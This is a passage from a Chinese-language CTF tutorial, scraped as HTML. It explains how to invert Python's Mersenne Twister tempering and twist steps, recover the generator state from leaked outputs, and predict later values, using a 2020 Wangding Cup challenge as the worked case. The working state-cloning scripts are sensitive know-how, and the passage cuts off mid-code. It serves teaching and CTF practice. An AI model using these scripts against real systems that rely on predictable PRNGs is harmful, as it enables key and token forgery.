class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span>tmp <span class="token operator">=</span> y<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">//</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># (y&lt;&lt;15)&amp;40022730752 每次可以恢复y的15位</span>    y <span class="token operator">=</span> tmp <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token operator">==</span>o<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>剩下的两步操作，可以采用同样的分析方法进行逆行。最终完整的代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">o <span class="token operator">=</span> <span class="token number">2080737669</span><span class="token comment"># right shift inverse</span><span class="token keyword">def</span> <span class="token function">inverse_right</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> shift<span class="token punctuation">,</span> bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits <span class="token operator">//</span> shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&gt;&gt;</span> shift    <span class="token keyword">return</span> tmp<span class="token comment"># right shift with mask inverse</span><span class="token keyword">def</span> <span class="token function">inverse_right_mask</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> shift<span class="token punctuation">,</span> mask<span class="token punctuation">,</span> bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits <span class="token operator">//</span> shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&gt;&gt;</span> shift <span class="token operator">&amp;</span> mask    <span class="token keyword">return</span> tmp<span class="token comment"># left shift inverse</span><span class="token keyword">def</span> <span class="token function">inverse_left</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> shift<span class="token punctuation">,</span> bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits <span class="token operator">//</span> shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&lt;&lt;</span> shift    <span class="token keyword">return</span> tmp<span class="token comment"># left shift with mask inverse</span><span class="token keyword">def</span> <span class="token function">inverse_left_mask</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> shift<span class="token punctuation">,</span> mask<span class="token punctuation">,</span> bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits <span class="token operator">//</span> shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&lt;&lt;</span> shift <span class="token operator">&amp;</span> mask    <span class="token keyword">return</span> tmp<span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&gt;&gt;</span> <span class="token number">11</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">&amp;</span> <span class="token number">2636928640</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&gt;&gt;</span> <span class="token number">18</span>    <span class="token keyword">return</span> y<span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token keyword">def</span> <span class="token function">recover</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> inverse_right<span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> inverse_left_mask<span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">4022730752</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> inverse_left_mask<span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2636928640</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> inverse_right<span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> y<span class="token operator">&amp;</span><span class="token number">0xffffffff</span>y <span class="token operator">=</span> extract_number<span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>recover<span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> o<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述讨论的部分是，基于对extract_number函数的观察得到的逆向方法，除此之外我们还可以从extract_number的运算本质上进行逆向。</p><p>设state[i]的二进制表示形式为：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t015889f9641ca5b15f.png"></p><p>输出的随机数二进制形式为：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t0135e3100aff316022.png"></p><p>而z和x具有如下线性关系：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t01d8610041cc328172.png"></p><p>也就是说</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t01b81240c6e6a8745d.png"></p><p>其中X,Z是GF(2)上的1 x 32的向量，T是GF(2)上的 32 x32的矩阵。我们只需要在GF(2)上求解X即可。已知Z，如果T也已知，可以快速的求解出X。那么如何计算T呢？</p><p>实际上我们可以采用黑盒测试的方法，猜解T。例如当X为(1,0,0,0,…..0)时，经过T得到的Z其实就是T中第一行。采用这种类似选择明文攻击的方法，我们可以得到T矩阵的每一行，进而还原T。最后再利用T和Z得到原始的X。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># sagemath 9.0</span><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">def</span> <span class="token function">buildT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    T <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>        <span class="token comment"># 构造特殊的state</span>        s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token operator">-</span>i<span class="token punctuation">)</span>        rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>s<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        <span class="token comment"># 获取T矩阵的每一行</span>        row <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        T<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> row    <span class="token keyword">return</span> T<span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>leak<span class="token punctuation">)</span><span class="token punctuation">:</span>    Z <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> T<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>Z<span class="token punctuation">)</span>    state <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> X<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> state<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 泄露信息</span>    leak <span class="token operator">=</span> <span class="token punctuation">[</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    originState <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> rng<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token comment"># 构造矩阵T</span>    T <span class="token operator">=</span> buildT<span class="token punctuation">(</span><span class="token punctuation">)</span>    recoverState <span class="token operator">=</span> <span class="token punctuation">[</span>reverse<span class="token punctuation">(</span>T<span class="token punctuation">,</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> leak<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>recoverState<span class="token operator">==</span>originState<span class="token punctuation">)</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的黑盒测试思想，会在后面的题型x，得到应用。希望读者理解后再继续阅读</p><h2 id="题型2-预测随机数">题型2 预测随机数</h2><p>这一类题型是基于对extract_number函数的逆向，而发展来的。这里以2020年网鼎杯白虎组的random为例</p><h3 id="网鼎杯白虎组random">2020网鼎杯白虎组random</h3><p>定位到关键函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    fw <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">700</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"n"</span><span class="token punctuation">)</span>    fw<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> encryption<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现加密的key时第701个随机数，而且我们已知前700个随机数。于是可以根据输出的随机数逆向extract_number得到对应的700个state，实际上只需要前624个随机数恢复前624个state，就可以预测此后生成的随机数。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">def</span> <span class="token function">invert_right</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>l<span class="token punctuation">,</span>val<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">32</span>    mx <span class="token operator">=</span> <span class="token number">0xffffffff</span>    <span class="token keyword">if</span> val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> mx    i<span class="token punctuation">,</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">*</span>l<span class="token operator">&lt;</span>length<span class="token punctuation">:</span>        mask <span class="token operator">=</span> <span class="token punctuation">(</span>mx<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>length<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">&amp;</span>mx<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span>i<span class="token operator">*</span>l        tmp <span class="token operator">=</span> m <span class="token operator">&amp;</span> mask        m <span class="token operator">=</span> m<span class="token operator">^</span>tmp<span class="token operator">&gt;&gt;</span>l<span class="token operator">&amp;</span>val        res <span class="token operator">+=</span> tmp        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">invert_left</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>l<span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    length <span class="token operator">=</span> <span class="token number">32</span>    mx <span class="token operator">=</span> <span class="token number">0xffffffff</span>    i<span class="token punctuation">,</span>res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">*</span>l <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>        mask <span class="token operator">=</span> <span class="token punctuation">(</span>mx<span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span>length<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">&amp;</span>mx<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">*</span>l        tmp <span class="token operator">=</span> m <span class="token operator">&amp;</span> mask        m <span class="token operator">^</span><span class="token operator">=</span> tmp<span class="token operator">&lt;&lt;</span>l<span class="token operator">&amp;</span>val        res <span class="token operator">|</span><span class="token operator">=</span> tmp        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">invert_temper</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> invert_right<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_left<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">4022730752</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_left<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2636928640</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> invert_right<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token keyword">def</span> <span class="token function">clone_mt</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span>invert_temper<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> record<span class="token punctuation">]</span>    gen <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    gen<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> genf <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>prng <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>    prng<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>g <span class="token operator">=</span> clone_mt<span class="token punctuation">(</span>prng<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">700</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>key <span class="token operator">=</span> g<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#2990136190</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中逆向extract_number部分的invert_right函数和题型1中的代码不同，但是效果是相同的(很久之前写的，所以直接粘过来了。)得到key之后就是常规的des解密，最后可以得到flag。</p><h2 id="题型3-逆向twist">题型3 逆向twist</h2><p>在已知连续624个随机数时(state没有进行twist)，可以还原state，预测后续的随机数。那么如何获得624个随机数之前的随机数呢？此时可以考虑，逆向twist获得前一组的state，进而获得前一组的624个随机数。</p><p>首先看一下twist函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">twist</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            y <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">624</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">397</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">624</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> y <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x9908b0df</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考虑下面的例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span> <span class="token number">11100110110101000100101111000001</span> <span class="token operator">//</span> state<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token number">2.</span> <span class="token number">10101110111101011001001001011111</span> <span class="token operator">//</span> state<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token number">3.</span> <span class="token number">11101010010001001010000001001001</span> <span class="token operator">//</span> state<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">397</span><span class="token punctuation">]</span><span class="token operator">//</span> y <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x80000000</span> <span class="token operator">|</span> state<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fffffff</span><span class="token number">4.</span> <span class="token number">10101110111101011001001001011111</span> <span class="token operator">//</span> y<span class="token number">5.</span> <span class="token number">01010111011110101100100100101111</span> <span class="token operator">//</span> <span class="token builtin">next</span> <span class="token operator">=</span> y <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token number">6.</span> <span class="token number">11001110011100100111100111110000</span> <span class="token operator">//</span> <span class="token builtin">next</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token number">0x9908b0df</span> <span class="token number">0x9908b0df</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">10011001000010001011000011011111</span><span class="token number">7.</span> <span class="token number">00100100001101101101100110111001</span> <span class="token operator">//</span> <span class="token builtin">next</span> <span class="token operator">^</span><span class="token operator">=</span> state<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">397</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们知道生成新的state[i]只与原来的state[i],state[i+1],state[i+397]有关。第7步是必须进行的一步(异或的次序不影响结果，所以异或state[i+397]可以看成最后一步),第6步是根据第4步结果的奇偶性确定的,不一定有第6步,但是因为第7步是第5步或者第6步异或state[i+397]的结果,我们可以考察新生成的state[i]异或state[i+397]的结果，来判断是否进行了第六步的操作。</p><p>由于0x9908b0df =&gt;10011001000010001011000011011111,而第5步的最高位必定是0,但是如果执行了第6步那么执行后的结果首位则会变成1,于是我们可以根据第7步逆向出的结果的首位判断是否进行了第6步.进而推出第5步,第5步的后31位包含了state[i]的第1位和state[i+1]的第2位至第31位,根据第6步是否进行可以得到state[i+1]的最后1位,所以根据现在的state[i]和以前的state[i+397],可以获得原来state[i]的1位信息和state[i+1]的31位信息,要获得state[i]剩下的31位信息,需要对现在的state[i-1]进行同样的运算.当需要计算第一位state时,剩下的state都已经恢复了,可以利用恢复了的最后一位state获得还未恢复的state[0]的后31位,非常巧妙!</p><p>实现代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">backtrace</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">0x80000000</span>    low <span class="token operator">=</span> <span class="token number">0x7fffffff</span>    mask <span class="token operator">=</span> <span class="token number">0x9908b0df</span>    state <span class="token operator">=</span> cur    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">623</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">397</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">624</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        <span class="token comment"># recover highest bit</span>        res <span class="token operator">=</span> tmp<span class="token operator">&amp;</span>high        <span class="token comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">396</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">624</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token 